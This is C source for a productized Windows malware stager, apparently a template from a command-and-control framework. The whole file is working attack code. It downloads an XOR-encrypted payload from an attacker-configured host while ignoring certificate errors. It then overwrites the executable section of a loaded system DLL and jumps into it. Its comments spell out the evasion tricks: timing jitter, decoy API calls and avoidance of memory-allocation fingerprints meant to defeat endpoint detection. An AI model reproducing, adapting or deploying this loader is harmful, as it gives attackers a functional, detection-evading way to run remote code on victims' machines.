/*
 * stager_win.c — productized Windows stager (module-stomping).
 * Placeholders filled by pl_stager.go at generate time.
 *
 * Runtime shape (anti-behavior, not static packing):
 *  - short jitter before network
 *  - WinINet with PRECONFIG (less "raw implant" than DIRECT)
 *  - HeapAlloc RW buffer (avoid VirtualAlloc download fingerprint)
 *  - decrypt → free handles → second jitter → stomp → jump
 *  - no VirtualAlloc RWX; stomped .text ends RX only
 */
#include <windows.h>
#include <wininet.h>

#define STAGER_HOST "@@STAGER_HOST@@"
#define STAGER_PORT @@STAGER_PORT@@
#define STAGER_PATH "@@STAGER_PATH@@"
#define STAGER_SSL  @@STAGER_SSL@@
#define STAGER_UA   "@@STAGER_UA@@"
#define STAGER_PRE_MS  @@STAGER_PRE_MS@@
#define STAGER_MID_MS  @@STAGER_MID_MS@@

static const unsigned char KEY[] = { @@STAGER_KEY@@ };

/* Prefer a single per-build sacrificial DLL first, then fall back. */
static const char *SACRIFICIAL_DLLS[] = {
    "@@STAGER_DLL@@",
    "ole32.dll", "shell32.dll", "crypt32.dll", "dbghelp.dll", "winmm.dll", NULL
};

static void stager_jitter_ms(DWORD baseMs) {
    if (baseMs == 0) return;
    DWORD extra = GetTickCount() % 400;
    Sleep(baseMs + extra);
}

/* Cheap benign touches so the first observed APIs are not pure loader chain. */
static void stager_warmup(void) {
    SYSTEMTIME st;
    char tmp[MAX_PATH];
    GetSystemTime(&st);
    GetTickCount();
    GetSystemDirectoryA(tmp, MAX_PATH);
    GetModuleFileNameA(NULL, tmp, MAX_PATH);
}

static unsigned char *find_text_region(HMODULE base, SIZE_T minSize, SIZE_T *outSize) {
    if (!base) return NULL;
    unsigned char *p = (unsigned char *)base;
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)p;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(p + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return NULL;
    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if ((sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
            sec[i].Misc.VirtualSize >= minSize) {
            *outSize = sec[i].Misc.VirtualSize;
            return p + sec[i].VirtualAddress;
        }
    }
    return NULL;
}

static int stager_download(unsigned char **outBuf, DWORD *outLen) {
    *outBuf = NULL;
    *outLen = 0;

    HINTERNET hInet = InternetOpenA(STAGER_UA, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hInet) return 2;

    HINTERNET hConn = InternetConnectA(hInet, STAGER_HOST, (INTERNET_PORT)STAGER_PORT,
                                       NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConn) { InternetCloseHandle(hInet); return 3; }

    DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE |
                  INTERNET_FLAG_NO_UI | INTERNET_FLAG_PRAGMA_NOCACHE |
                  INTERNET_FLAG_KEEP_CONNECTION;
#if STAGER_SSL
    flags |= INTERNET_FLAG_SECURE
          |  INTERNET_FLAG_IGNORE_CERT_CN_INVALID
          |  INTERNET_FLAG_IGNORE_CERT_DATE_INVALID;
#endif

    HINTERNET hReq = HttpOpenRequestA(hConn, "GET", STAGER_PATH, "HTTP/1.1",
                                      NULL, NULL, flags, 0);
    if (!hReq) {
        InternetCloseHandle(hConn);
        InternetCloseHandle(hInet);
        return 4;
    }

#if STAGER_SSL
    {
        DWORD secFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA
                       | SECURITY_FLAG_IGNORE_CERT_CN_INVALID
                       | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
        InternetSetOptionA(hReq, INTERNET_OPTION_SECURITY_FLAGS, &secFlags, sizeof(secFlags));
    }
#endif

    if (!HttpSendRequestA(hReq, NULL, 0, NULL, 0)) {
        InternetCloseHandle(hReq);
        InternetCloseHandle(hConn);
        InternetCloseHandle(hInet);
        return 5;
    }

    DWORD status = 0, statusLen = sizeof(status);
    if (HttpQueryInfoA(hReq, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER,
                       &status, &statusLen, NULL)) {
        if (status < 200 || status >= 300) {
            InternetCloseHandle(hReq);
            InternetCloseHandle(hConn);
            InternetCloseHandle(hInet);
            return 11;
        }
    }

    DWORD cap = 256 * 1024;
    unsigned char *buf = (unsigned char *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cap);
    if (!buf) {
        InternetCloseHandle(hReq);
        InternetCloseHandle(hConn);
        InternetCloseHandle(hInet);
        return 6;
    }

    DWORD total = 0, got = 0;
    for (;;) {
        if (total + 16384 > cap) {
            DWORD ncap = cap * 2;
            if (ncap > 8 * 1024 * 1024) break;
            unsigned char *nbuf = (unsigned char *)HeapReAlloc(GetProcessHeap(), 0, buf, ncap);
            if (!nbuf) break;
            buf = nbuf;
            cap = ncap;
        }
        if (!InternetReadFile(hReq, buf + total, 16384, &got) || got == 0) break;
        total += got;
    }

    InternetCloseHandle(hReq);
    InternetCloseHandle(hConn);
    InternetCloseHandle(hInet);

    if (total == 0) {
        HeapFree(GetProcessHeap(), 0, buf);
        return 7;
    }

    *outBuf = buf;
    *outLen = total;
    return 0;
}

static int stager_stomp_and_run(unsigned char *buf, DWORD total) {
    unsigned char *spot = NULL;
    SIZE_T spotSz = 0;

    for (int i = 0; SACRIFICIAL_DLLS[i] && !spot; i++) {
        if (!SACRIFICIAL_DLLS[i][0]) continue;
        HMODULE hDll = LoadLibraryExA(SACRIFICIAL_DLLS[i], NULL, DONT_RESOLVE_DLL_REFERENCES);
        if (!hDll) continue;
        SIZE_T sz = 0;
        unsigned char *t = find_text_region(hDll, (SIZE_T)total, &sz);
        if (t) {
            spot = t;
            spotSz = sz;
        }
    }
    if (!spot || spotSz < (SIZE_T)total) return 8;

    DWORD old = 0;
    if (!VirtualProtect(spot, total, PAGE_READWRITE, &old)) return 9;

    for (DWORD i = 0; i < total; i++) spot[i] = buf[i];

    /* Wipe source buffer before execute so only stomped image remains. */
    SecureZeroMemory(buf, total);
    HeapFree(GetProcessHeap(), 0, buf);

    if (!VirtualProtect(spot, total, PAGE_EXECUTE_READ, &old)) return 10;

    /* Tiny settle before control transfer (breaks "protect→call" atomic pattern). */
    stager_jitter_ms(80);

    ((void (*)(void))spot)();
    return 0;
}

int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d) {
    (void)a; (void)b; (void)c; (void)d;

    stager_warmup();
    stager_jitter_ms((DWORD)STAGER_PRE_MS);

    unsigned char *buf = NULL;
    DWORD total = 0;
    int rc = stager_download(&buf, &total);
    if (rc != 0) return rc;

    for (DWORD i = 0; i < total; i++) buf[i] ^= KEY[i % sizeof(KEY)];

    /* Decouple network phase from memory-write/execute phase. */
    stager_jitter_ms((DWORD)STAGER_MID_MS);
    stager_warmup();

    return stager_stomp_and_run(buf, total);
}
